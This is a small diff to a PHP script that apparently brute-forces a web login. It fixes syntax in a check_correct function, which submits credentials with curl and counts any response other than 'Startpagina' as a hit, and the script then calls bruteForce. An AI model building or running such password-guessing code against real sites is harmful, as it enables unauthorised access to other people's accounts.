@@ -27,6 +27,7 @@ while(True)
 </body>
 </html>");
     }
+}
     echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
     <tr>
         <td>
@@ -51,7 +52,7 @@ function check_correct($username, $Pass)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 0); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c); 
-	if($str != "Startpagina") {return $true;}
+	if($str != "Startpagina") {return true;}
         else {return false;}
 }
 bruteForce($Pass1);
